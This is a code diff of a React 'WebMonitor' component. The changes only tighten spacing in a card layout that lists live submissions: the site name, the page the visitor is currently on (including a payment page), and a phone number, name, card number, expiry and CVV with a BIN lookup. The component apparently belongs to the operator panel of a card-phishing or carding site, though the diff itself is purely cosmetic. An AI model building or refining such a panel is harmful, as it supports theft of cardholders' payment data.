@@ -224,13 +224,13 @@ export function WebMonitor() {
 
       <div className="p-6">
         {/* Card Layout with Borders -按照用户要求的信息顺序 */}
-        <div className="space-y-4">
+        <div className="space-y-2">
           {submissionData.map((submission, index) => (
-            <div key={submission.id} className="bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-shadow p-4">
+            <div key={submission.id} className="bg-white border border-gray-200 rounded-lg shadow-sm hover:shadow-md transition-shadow p-3">
               {/* 顶部：编号、前台页面、正在payment页面 */}
-              <div className="flex items-center justify-between mb-3 pb-3 border-b border-gray-100">
-                <div className="flex items-center gap-4">
-                  <div className="flex items-center gap-2">
+              <div className="flex items-center justify-between mb-2 pb-2 border-b border-gray-100">
+                <div className="flex items-center gap-3">
+                  <div className="flex items-center gap-1">
                     <span className="text-sm text-muted-foreground">编号:</span>
                     <Badge
                       variant="outline"
@@ -247,18 +247,18 @@ export function WebMonitor() {
                     </Badge>
                   </div>
 
-                  <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-1">
                     <span className="text-sm text-muted-foreground">前台页面:</span>
                     <span className="text-sm font-medium">{submission.websiteName}</span>
                   </div>
 
-                  <div className="flex items-center gap-2">
+                  <div className="flex items-center gap-1">
                     <span className="text-sm text-muted-foreground">正在页面:</span>
                     <span className="text-sm font-medium text-blue-600">{submission.currentPage}</span>
                   </div>
                 </div>
 
-                <div className="flex items-center gap-3">
+                <div className="flex items-center gap-2">
                   <Badge
                     variant="outline"
                     className={`text-xs ${
@@ -276,7 +276,7 @@ export function WebMonitor() {
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
-              <div className="grid grid-cols-6 gap-4 mb-3">
+              <div className="grid grid-cols-6 gap-3 mb-2">
                 <div>
                   {submission.binLookup ? (
                     <div className="flex items-center gap-1">
@@ -330,7 +330,7 @@ export function WebMonitor() {
               </div>
 
               {/* 底部：处理进度和操作按钮 */}
-              <div className="flex items-center justify-between pt-3 border-t border-gray-100">
+              <div className="flex items-center justify-between pt-2 border-t border-gray-100">
                 <div className="flex items-center gap-4">
                   {submission.progress ? (
                     <div className="min-w-[180px]">
